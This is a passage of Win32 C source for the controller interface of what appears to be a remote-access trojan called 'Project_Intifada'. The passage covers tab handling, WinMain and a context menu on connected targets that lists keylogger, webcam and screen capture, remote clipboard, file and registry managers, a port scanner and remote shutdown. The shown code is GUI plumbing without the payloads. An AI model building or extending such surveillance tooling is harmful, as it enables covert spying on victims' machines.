            int iPage = TabCtrl_GetCurSel(GetDlgItem(hwndDlg,IDC_MainTAB ));

            switch(iPage)
            {
            case 0:
            {

                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING1_GRP ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING2_GRP ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_UTILPORT_EDIT ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_MAINPORT_EDIT ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT1 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC3 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC4 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC5 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST7 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST8 ),SW_HIDE);



            }
            break;

            case 1:
            {

                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST7 ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING1_GRP ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING2_GRP ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_UTILPORT_EDIT ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_MAINPORT_EDIT ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT1 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC3 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC4 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC5 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST8 ),SW_HIDE);



            }
            break;

            case 2:
            {
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING1_GRP ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING2_GRP ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_UTILPORT_EDIT ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_MAINPORT_EDIT ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT1 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT2 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC3 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC4 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC5 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST7 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndDlg, IDC_LIST8 ),SW_SHOW);


            }
            break;



            }

        }
        break;
        }




            switch(LOWORD(wParam))
            {
            case IDC_LIST:
                if(((LPNMHDR)lParam)->code == NM_RCLICK)
                {

                    int iSlected=0;

                    iSlected=SendMessage(hList,LVM_GETNEXTITEM,-1,LVNI_SELECTED);

                    if(iSlected==-1)
                    {
                        break;
                    }

                    flag=1;



                    GetClientRect(hwndDlg, (LPRECT) &rc);

                    // Get the client coordinates for the mouse click.
                    GetCursorPos(&pt);
                    pt.y += 10;
                    pt.x += 10;


                    hmenu = CreatePopupMenu(); //= LoadMenu(hInst, MAKEINTRESOURCE(ID_MAIN_MENU));
                    hmenuTrackPopup1 = CreateMenu();
                    hmenuTrackPopup2 = CreateMenu();
                    hmenuTrackPopup3 = CreateMenu();
                    hmenuTrackPopup4 = CreateMenu();

                    HBITMAP hTMBitMap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ADMIN));
                    HBITMAP hTMBitMap2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SPY));
                    HBITMAP hTMBitMap3 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SYSCONTROL));
                    HBITMAP hTMBitMap4 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_FILEMAN));
                    HBITMAP hTMBitMap5 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TASKMAN));
                    HBITMAP hTMBitMap6 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_REGMAN));
                    HBITMAP hTMBitMap7 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SCRSHT));
                    HBITMAP hTMBitMap8 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_WEBCAM));
                    HBITMAP hTMBitMap9 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_KELOG));
                    HBITMAP hTMBitMap10 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SHUTDWN));
                    HBITMAP hTMBitMap11 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_LOGOFF));
                    HBITMAP hTMBitMap12 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_POWERON));
                    HBITMAP hTMBitMap13 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_POWEROFF));
                    HBITMAP hTMBitMap14 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_NETWORK));
                    HBITMAP hTMBitMap15 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_WEBPAGE));
                    HBITMAP hTMBitMap16 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_HOSTINFO));
                    HBITMAP hTMBitMap17 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SCANPORT));
                    HBITMAP hTMBitMap18 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PASTE));


                    AppendMenu(hmenu,MF_STRING | MF_POPUP,(UINT)hmenuTrackPopup1,"Admin functions");
                    SetMenuItemBitmaps(hmenu,(UINT)hmenuTrackPopup1,MF_BITMAP,hTMBitMap,hTMBitMap);

                    AppendMenu(hmenuTrackPopup1, MF_STRING, ID_TOOLS_FILEMANAGER,"File manager");
                    SetMenuItemBitmaps(hmenuTrackPopup1,ID_TOOLS_FILEMANAGER,MF_BITMAP,hTMBitMap4,hTMBitMap4);
                    AppendMenu(hmenuTrackPopup1, MF_STRING, ID_TOOLS_TASKMANAGER,"Task manager");
                    SetMenuItemBitmaps(hmenuTrackPopup1,ID_TOOLS_TASKMANAGER,MF_BITMAP,hTMBitMap5,hTMBitMap5);
                    AppendMenu(hmenuTrackPopup1, MF_STRING, ID_TOOLS_REGMAN,"Registry manager");
                    SetMenuItemBitmaps(hmenuTrackPopup1,ID_TOOLS_REGMAN,MF_BITMAP,hTMBitMap6,hTMBitMap6);

                    AppendMenu(hmenu,MF_STRING | MF_POPUP,(UINT)hmenuTrackPopup2,"Surveillance functions");
                    SetMenuItemBitmaps(hmenu,(UINT)hmenuTrackPopup2,MF_BITMAP,hTMBitMap2,hTMBitMap2);

                    AppendMenu(hmenuTrackPopup2, MF_STRING, IDC_SCREEN_CAP,"Screen capture");
                    SetMenuItemBitmaps(hmenuTrackPopup2,IDC_SCREEN_CAP,MF_BITMAP,hTMBitMap7,hTMBitMap7);
                    AppendMenu(hmenuTrackPopup2, MF_STRING, ID_WEBCAM_CAP,"Webcam capture");
                    SetMenuItemBitmaps(hmenuTrackPopup2,ID_WEBCAM_CAP,MF_BITMAP,hTMBitMap8,hTMBitMap8);
                    AppendMenu(hmenuTrackPopup2, MF_SEPARATOR,IDC_SEP1,"");
                    AppendMenu(hmenuTrackPopup2, MF_STRING, ID_TOOLS_KEYLOGGER,"Keylogger");
                    SetMenuItemBitmaps(hmenuTrackPopup2,ID_TOOLS_KEYLOGGER,MF_BITMAP,hTMBitMap9,hTMBitMap9);
                    AppendMenu(hmenuTrackPopup2, MF_STRING, IDC_REM_CLIPBOARD,"Remote clipboard");
                    SetMenuItemBitmaps(hmenuTrackPopup2,IDC_REM_CLIPBOARD,MF_BITMAP,hTMBitMap18,hTMBitMap18);


                    AppendMenu(hmenu,MF_STRING | MF_POPUP,(UINT)hmenuTrackPopup3,"Network functions");
                    SetMenuItemBitmaps(hmenu,(UINT)hmenuTrackPopup3,MF_BITMAP,hTMBitMap14,hTMBitMap14);
                    AppendMenu(hmenuTrackPopup3, MF_STRING, IDC_BROWSE_WEB,"Browse webpage");
                    SetMenuItemBitmaps(hmenuTrackPopup3,IDC_BROWSE_WEB,MF_BITMAP,hTMBitMap15,hTMBitMap15);
                    AppendMenu(hmenuTrackPopup3, MF_STRING, IDC_SCAN_PORT,"Port scanner");
                    SetMenuItemBitmaps(hmenuTrackPopup3,IDC_SCAN_PORT,MF_BITMAP,hTMBitMap17,hTMBitMap17);


                    AppendMenu(hmenu,MF_STRING | MF_POPUP,(UINT)hmenuTrackPopup4,"System controls");
                    SetMenuItemBitmaps(hmenu,(UINT)hmenuTrackPopup4,MF_BITMAP,hTMBitMap3,hTMBitMap3);

                    AppendMenu(hmenuTrackPopup4, MF_STRING, IDC_SYS_SHTDWN,"Shutdown");
                    SetMenuItemBitmaps(hmenuTrackPopup4,IDC_SYS_SHTDWN,MF_BITMAP,hTMBitMap10,hTMBitMap10);
                    AppendMenu(hmenuTrackPopup4, MF_STRING, IDC_SYS_LGOFF,"Log off");
                    SetMenuItemBitmaps(hmenuTrackPopup4,IDC_SYS_LGOFF,MF_BITMAP,hTMBitMap11,hTMBitMap11);
                    AppendMenu(hmenuTrackPopup4, MF_SEPARATOR,IDC_SEP1,"");
                    AppendMenu(hmenuTrackPopup4, MF_STRING, IDC_SYS_MOFF,"Monitor OFF");
                    SetMenuItemBitmaps(hmenuTrackPopup4,IDC_SYS_MOFF,MF_BITMAP,hTMBitMap13,hTMBitMap13);
                    AppendMenu(hmenuTrackPopup4, MF_STRING, IDC_SYS_MON,"Monitor ON");
                    SetMenuItemBitmaps(hmenuTrackPopup4,IDC_SYS_MON,MF_BITMAP,hTMBitMap12,hTMBitMap12);

                    AppendMenu(hmenu, MF_STRING, IDC_HOST_INFO,"System information");
                    SetMenuItemBitmaps(hmenu,IDC_HOST_INFO,MF_BITMAP,hTMBitMap16,hTMBitMap16);


                   /* if (hmenu == NULL)
                    {
                        break;
                    }
                    // Get the first shortcut menu in the menu template. This is the
                    // menu that TrackPopupMenu displays.
                    hmenuTrackPopup = GetSubMenu(hmenu, 0);*/
                    TrackPopupMenu(hmenu/*TrackPopup*/, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwndDlg, NULL);





                    memset(&LvItem,0,sizeof(LvItem));
                    LvItem.mask=LVIF_TEXT;
                    LvItem.iSubItem=10;
                    LvItem.pszText=MTemp;
                    LvItem.cchTextMax=256;
                    LvItem.iItem=iSlected;

                    SendMessage(hList,LVM_GETITEMTEXT,
                                iSlected, (LPARAM)&LvItem);
                    //sprintf(TargetID,Text);
                    TargetID = atoi(MTemp);

                    LvItem.iSubItem=4;
                    SendMessage(hList,LVM_GETITEMTEXT,
                                iSlected, (LPARAM)&LvItem);


                }
            }
        }
        return TRUE;






    /*case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LONG)g_hbrBackground;
    }
    break;*/

    case WM_PAINT:
    {
        BITMAP bm;
        PAINTSTRUCT ps;

        HDC hdc = BeginPaint(hwndDlg, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem,g_hbmScrSht);

        GetObject(g_hbmScrSht, sizeof(bm), &bm);

        BitBlt(hdc, 3, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);

        //RestoreDC(hdcMem);
        DeleteDC(hdc);
        //DeleteObject(g_hbmScrSht);
        //DeleteObject(hbmOld);

        EndPaint(hwndDlg, &ps);

    }
    break;

    }
    return FALSE;
}





HANDLE hRichEdit;
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    //SkinWin_Start("Modern.sws");

    HMODULE hUser32 = GetModuleHandle(("USER32.DLL"));
    hRichEdit = LoadLibrary( "RICHED32.DLL" );


    INITCOMMONCONTROLSEX iccx;
    iccx.dwSize = sizeof(INITCOMMONCONTROLSEX);

    iccx.dwICC = ICC_ANIMATE_CLASS;

    InitCommonControlsEx(&iccx);

    InitSettings();


    HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "Project_Intifada");

    if(hMutex == NULL)
    {
        hMutex = CreateMutex(NULL, FALSE, "Project_Intifada");
    }

    else
    {
        if(strstr(isOneInstance,"ON"))
        {
         MessageBox(NULL,"Only one instance of Project_Intifada is allowed to run on your computer.\nTo allow multiple instances goto: Options>>Settings>>General","Multi instance",MB_OK|MB_ICONERROR);
         return 0;
        }
    }

    MainInst = hInstance;
    AInst = hInstance;
    EInst = hInstance;
    //DialogBox(AInst,(LPCTSTR)About_Dlg,0,(DLGPROC)About_Dlg_Proc);

    hwndMain = CreateDialog(hInstance,(LPCTSTR)DLG_MAIN,NULL,(DLGPROC)DialogProc);

    SendMessage(hwndMain, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndMain, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));
    //DialogBox(hInstance,(LPCTSTR)Keylog_Dlg,0,(DLGPROC)Keylog_DlgProc);
    //hwndKeylog = CreateDialog(kInst,(LPCTSTR)Keylog_DlgProc,NULL,(DLGPROC)DialogProc);

    MSG msg;
    while(GetMessage(&msg,hwndMain,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

    // The user interface is a modal dialog box
    //return DialogBox(hInstance, MAKEINTRESOURCE(DLG_MAIN), NULL, (DLGPROC)DialogProc);
   // SkinWin_Stop();
}



